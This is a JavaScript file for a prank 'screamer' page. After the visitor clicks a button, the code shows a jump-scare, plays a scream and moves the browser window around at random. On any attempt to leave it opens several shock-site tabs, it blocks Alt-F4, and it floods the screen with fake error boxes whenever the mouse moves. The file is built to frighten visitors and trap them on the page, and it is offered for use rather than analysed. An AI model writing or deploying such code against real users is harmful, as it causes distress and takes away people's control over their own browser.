document.getElementById('continue').addEventListener('click', function() {
    // Hide initial content
    document.getElementById('content').style.display = 'none';

    // Show the screamer
    const screamer = document.getElementById('screamer');
    screamer.style.display = 'flex';

    // Play scream sound
    const screamSound = new Audio('scream.mp3');
    screamSound.play();

    // Start the window bouncing effect
    bounceWindow();

    // Prevent closing the tab by duplicating the window
    window.onbeforeunload = function() {
        // Open shock sites in new tabs
        window.open('https://youareanidiot.cc', '_blank');
        window.open('https://web.archive.org/web/20120715033649/imslow.kr/ghost/index.html', '_blank');
        window.open('https://web.archive.org/web/20121127080444/kkzkk.com', '_blank');
        window.open('https://web.archive.org/web/20140807232916/bendrowned.olympe.in/majora', '_blank');

        return "Got scared, bro? Hahahahahaha! XD"; // Message
    };

    // Show custom error box on mouse movement
    document.addEventListener('mousemove', function() {
        showErrorBox("XD"); // Custom error message
    });

    // Detect Alt-F4 or task manager attempt
    document.addEventListener('keydown', function(event) {
        if (event.altKey && event.key === 'F4') {
            event.preventDefault(); // Prevent the default action
            showErrorBox("LET'S WIN!!!"); // Show custom error message
        }
    });
});

// Function to show custom error box
function showErrorBox(message) {
    const errorBox = document.createElement('div');
    errorBox.style.position = 'fixed';
    errorBox.style.top = '50%';
    errorBox.style.left = '50%';
    errorBox.style.transform = 'translate(-50%, -50%)';
    errorBox.style.backgroundColor = '#f00'; // Red background
    errorBox.style.color = '#fff'; // White text
    errorBox.style.padding = '20px';
    errorBox.style.border = '2px solid #000';
    errorBox.style.zIndex = '9999';
    errorBox.style.fontSize = '20px';
    errorBox.innerHTML = `<strong>Error:</strong> ${message}<br><button onclick="this.parentElement.remove();">OK</button>`;
    
    document.body.appendChild(errorBox);
}

function bounceWindow() {
    setInterval(() => {
        const x = Math.random() * (screen.width - 400); // Random x position
        const y = Math.random() * (screen.height - 400); // Random y position
        window.moveTo(x, y); // Move the window to a random position
    }, 500); // Bounce every 500 milliseconds
}